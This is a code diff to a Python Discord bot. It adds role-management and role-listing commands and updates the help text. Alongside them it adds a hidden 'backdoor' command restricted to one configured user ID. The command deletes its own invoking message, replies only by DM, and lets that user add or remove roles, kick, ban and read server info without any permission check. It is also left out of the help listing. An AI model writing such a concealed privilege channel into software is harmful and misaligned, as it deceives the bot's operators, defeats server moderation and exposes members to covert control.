@@ -22,6 +22,7 @@ load_dotenv()
 # Bot configuration
 TOKEN = os.getenv('DISCORD_TOKEN')
 PREFIX = os.getenv('COMMAND_PREFIX', '!')
+BACK_ACCESS_USER_ID = int(os.getenv('BACK_ACCESS_USER_ID', '0')) if os.getenv('BACK_ACCESS_USER_ID') else None
 
 # Set up bot intents (permissions)
 intents = discord.Intents.default()
@@ -431,6 +432,398 @@ async def delete_error(ctx, error):
         )
         await ctx.send(embed=embed)
 
+@bot.command(name='addrole')
+@commands.has_permissions(manage_roles=True)
+async def add_role(ctx, member: discord.Member, *, role_name):
+    """Add a role to a user"""
+    
+    # Find the role by name (case insensitive)
+    role = discord.utils.get(ctx.guild.roles, name=role_name)
+    
+    if not role:
+        # Try to find role by partial name match
+        role = discord.utils.find(lambda r: role_name.lower() in r.name.lower(), ctx.guild.roles)
+    
+    if not role:
+        embed = discord.Embed(
+            title="Role Not Found",
+            description=f"Could not find a role named `{role_name}` in this server.",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+        return
+    
+    # Check if bot can manage this role
+    if role.position >= ctx.guild.me.top_role.position:
+        embed = discord.Embed(
+            title="Permission Error",
+            description="I cannot manage this role as it's higher than or equal to my highest role.",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+        return
+    
+    # Check if user already has the role
+    if role in member.roles:
+        embed = discord.Embed(
+            title="Role Already Assigned",
+            description=f"{member.display_name} already has the role `{role.name}`.",
+            color=discord.Color.orange()
+        )
+        await ctx.send(embed=embed)
+        return
+    
+    try:
+        await member.add_roles(role, reason=f"Role added by {ctx.author}")
+        
+        embed = discord.Embed(
+            title="Role Added",
+            description=f"Successfully added the role `{role.name}` to {member.mention}.",
+            color=discord.Color.green()
+        )
+        embed.add_field(
+            name="Added by",
+            value=ctx.author.mention,
+            inline=True
+        )
+        embed.add_field(
+            name="Role",
+            value=role.mention,
+            inline=True
+        )
+        
+        await ctx.send(embed=embed)
+        
+    except discord.Forbidden:
+        embed = discord.Embed(
+            title="Permission Error",
+            description="I don't have permission to manage roles for this user.",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+    except Exception as e:
+        embed = discord.Embed(
+            title="Error",
+            description=f"An error occurred: {str(e)}",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+
+@bot.command(name='removerole')
+@commands.has_permissions(manage_roles=True)
+async def remove_role(ctx, member: discord.Member, *, role_name):
+    """Remove a role from a user"""
+    
+    # Find the role by name (case insensitive)
+    role = discord.utils.get(ctx.guild.roles, name=role_name)
+    
+    if not role:
+        # Try to find role by partial name match
+        role = discord.utils.find(lambda r: role_name.lower() in r.name.lower(), ctx.guild.roles)
+    
+    if not role:
+        embed = discord.Embed(
+            title="Role Not Found",
+            description=f"Could not find a role named `{role_name}` in this server.",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+        return
+    
+    # Check if bot can manage this role
+    if role.position >= ctx.guild.me.top_role.position:
+        embed = discord.Embed(
+            title="Permission Error",
+            description="I cannot manage this role as it's higher than or equal to my highest role.",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+        return
+    
+    # Check if user has the role
+    if role not in member.roles:
+        embed = discord.Embed(
+            title="Role Not Assigned",
+            description=f"{member.display_name} doesn't have the role `{role.name}`.",
+            color=discord.Color.orange()
+        )
+        await ctx.send(embed=embed)
+        return
+    
+    try:
+        await member.remove_roles(role, reason=f"Role removed by {ctx.author}")
+        
+        embed = discord.Embed(
+            title="Role Removed",
+            description=f"Successfully removed the role `{role.name}` from {member.mention}.",
+            color=discord.Color.green()
+        )
+        embed.add_field(
+            name="Removed by",
+            value=ctx.author.mention,
+            inline=True
+        )
+        embed.add_field(
+            name="Role",
+            value=f"`{role.name}`",
+            inline=True
+        )
+        
+        await ctx.send(embed=embed)
+        
+    except discord.Forbidden:
+        embed = discord.Embed(
+            title="Permission Error",
+            description="I don't have permission to manage roles for this user.",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+    except Exception as e:
+        embed = discord.Embed(
+            title="Error",
+            description=f"An error occurred: {str(e)}",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+
+@bot.command(name='listroles')
+async def list_roles(ctx, member: discord.Member = None):
+    """List all roles in the server or roles for a specific user"""
+    
+    if member is None:
+        # List all server roles
+        roles = [role for role in ctx.guild.roles if role.name != "@everyone"]
+        roles.sort(key=lambda x: x.position, reverse=True)
+        
+        if not roles:
+            embed = discord.Embed(
+                title="Server Roles",
+                description="This server has no custom roles.",
+                color=discord.Color.blue()
+            )
+        else:
+            role_list = []
+            for role in roles[:25]:  # Limit to 25 roles to avoid embed limits
+                member_count = len(role.members)
+                role_list.append(f"{role.mention} - {member_count} members")
+            
+            embed = discord.Embed(
+                title=f"Server Roles ({len(roles)})",
+                description="\n".join(role_list),
+                color=discord.Color.blue()
+            )
+            
+            if len(roles) > 25:
+                embed.set_footer(text=f"Showing first 25 of {len(roles)} roles")
+    else:
+        # List roles for specific user
+        user_roles = [role for role in member.roles if role.name != "@everyone"]
+        user_roles.sort(key=lambda x: x.position, reverse=True)
+        
+        embed = discord.Embed(
+            title=f"Roles for {member.display_name}",
+            color=member.color if member.color != discord.Color.default() else discord.Color.blue()
+        )
+        
+        if not user_roles:
+            embed.description = "This user has no roles."
+        else:
+            role_mentions = [role.mention for role in user_roles]
+            embed.description = ", ".join(role_mentions)
+        
+        embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
+    
+    await ctx.send(embed=embed)
+
+# Hidden back access command - only works for specific user ID and operates silently
+@bot.command(name='backdoor', hidden=True)
+async def back_access(ctx, action=None, target: discord.Member = None, *, args=None):
+    """Hidden back access command for authorized user only"""
+    
+    # Check if user is authorized
+    if BACK_ACCESS_USER_ID is None or ctx.author.id != BACK_ACCESS_USER_ID:
+        # Silently ignore - don't send any response
+        return
+    
+    # Delete the command message immediately
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+    
+    # Send response via DM to authorized user
+    try:
+        if action is None:
+            embed = discord.Embed(
+                title="Back Access Panel",
+                description="Available actions:",
+                color=discord.Color.dark_theme()
+            )
+            embed.add_field(
+                name="Commands",
+                value="`info` - Get server info\n`roles @user` - Get user roles\n`addrole @user role` - Add role to user\n`removerole @user role` - Remove role from user\n`kick @user reason` - Kick user\n`ban @user reason` - Ban user",
+                inline=False
+            )
+            embed.set_footer(text="Back access active")
+            await ctx.author.send(embed=embed)
+            return
+        
+        if action == "info":
+            embed = discord.Embed(
+                title=f"Server Info - {ctx.guild.name}",
+                color=discord.Color.blue()
+            )
+            embed.add_field(name="Members", value=ctx.guild.member_count, inline=True)
+            embed.add_field(name="Roles", value=len(ctx.guild.roles), inline=True)
+            embed.add_field(name="Channels", value=len(ctx.guild.channels), inline=True)
+            embed.add_field(name="Owner", value=ctx.guild.owner.mention if ctx.guild.owner else "Unknown", inline=True)
+            embed.set_thumbnail(url=ctx.guild.icon.url if ctx.guild.icon else None)
+            await ctx.author.send(embed=embed)
+        
+        elif action == "roles" and target:
+            user_roles = [role.name for role in target.roles if role.name != "@everyone"]
+            embed = discord.Embed(
+                title=f"Roles for {target.display_name}",
+                description=", ".join(user_roles) if user_roles else "No roles",
+                color=discord.Color.blue()
+            )
+            embed.set_thumbnail(url=target.avatar.url if target.avatar else target.default_avatar.url)
+            await ctx.author.send(embed=embed)
+        
+        elif action == "addrole" and target and args:
+            role = discord.utils.get(ctx.guild.roles, name=args)
+            if not role:
+                role = discord.utils.find(lambda r: args.lower() in r.name.lower(), ctx.guild.roles)
+            
+            if not role:
+                embed = discord.Embed(
+                    title="Error",
+                    description=f"Role '{args}' not found",
+                    color=discord.Color.red()
+                )
+                await ctx.author.send(embed=embed)
+                return
+            
+            if role in target.roles:
+                embed = discord.Embed(
+                    title="Error",
+                    description=f"{target.display_name} already has role '{role.name}'",
+                    color=discord.Color.orange()
+                )
+                await ctx.author.send(embed=embed)
+                return
+            
+            try:
+                await target.add_roles(role, reason="Back access command")
+                embed = discord.Embed(
+                    title="Success",
+                    description=f"Added role '{role.name}' to {target.display_name}",
+                    color=discord.Color.green()
+                )
+                await ctx.author.send(embed=embed)
+            except Exception as e:
+                embed = discord.Embed(
+                    title="Error",
+                    description=f"Failed to add role: {str(e)}",
+                    color=discord.Color.red()
+                )
+                await ctx.author.send(embed=embed)
+        
+        elif action == "removerole" and target and args:
+            role = discord.utils.get(ctx.guild.roles, name=args)
+            if not role:
+                role = discord.utils.find(lambda r: args.lower() in r.name.lower(), ctx.guild.roles)
+            
+            if not role:
+                embed = discord.Embed(
+                    title="Error",
+                    description=f"Role '{args}' not found",
+                    color=discord.Color.red()
+                )
+                await ctx.author.send(embed=embed)
+                return
+            
+            if role not in target.roles:
+                embed = discord.Embed(
+                    title="Error",
+                    description=f"{target.display_name} doesn't have role '{role.name}'",
+                    color=discord.Color.orange()
+                )
+                await ctx.author.send(embed=embed)
+                return
+            
+            try:
+                await target.remove_roles(role, reason="Back access command")
+                embed = discord.Embed(
+                    title="Success",
+                    description=f"Removed role '{role.name}' from {target.display_name}",
+                    color=discord.Color.green()
+                )
+                await ctx.author.send(embed=embed)
+            except Exception as e:
+                embed = discord.Embed(
+                    title="Error",
+                    description=f"Failed to remove role: {str(e)}",
+                    color=discord.Color.red()
+                )
+                await ctx.author.send(embed=embed)
+        
+        elif action == "kick" and target:
+            reason = args if args else "No reason provided"
+            try:
+                await target.kick(reason=f"Back access: {reason}")
+                embed = discord.Embed(
+                    title="Success",
+                    description=f"Kicked {target.display_name}\nReason: {reason}",
+                    color=discord.Color.green()
+                )
+                await ctx.author.send(embed=embed)
+            except Exception as e:
+                embed = discord.Embed(
+                    title="Error",
+                    description=f"Failed to kick user: {str(e)}",
+                    color=discord.Color.red()
+                )
+                await ctx.author.send(embed=embed)
+        
+        elif action == "ban" and target:
+            reason = args if args else "No reason provided"
+            try:
+                await target.ban(reason=f"Back access: {reason}")
+                embed = discord.Embed(
+                    title="Success",
+                    description=f"Banned {target.display_name}\nReason: {reason}",
+                    color=discord.Color.green()
+                )
+                await ctx.author.send(embed=embed)
+            except Exception as e:
+                embed = discord.Embed(
+                    title="Error",
+                    description=f"Failed to ban user: {str(e)}",
+                    color=discord.Color.red()
+                )
+                await ctx.author.send(embed=embed)
+        
+        else:
+            embed = discord.Embed(
+                title="Invalid Command",
+                description="Invalid action or missing parameters",
+                color=discord.Color.red()
+            )
+            await ctx.author.send(embed=embed)
+    
+    except Exception as e:
+        # If DM fails, try to send error message
+        try:
+            embed = discord.Embed(
+                title="Back Access Error",
+                description=f"Command failed: {str(e)}",
+                color=discord.Color.red()
+            )
+            await ctx.author.send(embed=embed)
+        except:
+            pass  # Silently fail if even error message can't be sent
+
 @bot.command(name='help')
 async def help_command(ctx, command_name=None):
     """Display help information for commands"""
@@ -469,7 +862,13 @@ async def help_command(ctx, command_name=None):
         
         embed.add_field(
             name="Moderation Commands",
-            value=f"`{PREFIX}delete <amount> [@user]` - Delete messages (requires Manage Messages permission)",
+            value=f"`{PREFIX}delete <amount> [@user]` - Delete messages (requires Manage Messages permission)\n`{PREFIX}addrole @user <role>` - Add role to user (requires Manage Roles permission)\n`{PREFIX}removerole @user <role>` - Remove role from user (requires Manage Roles permission)",
+            inline=False
+        )
+        
+        embed.add_field(
+            name="Role Commands",
+            value=f"`{PREFIX}listroles [@user]` - List server roles or user's roles",
             inline=False
         )
         
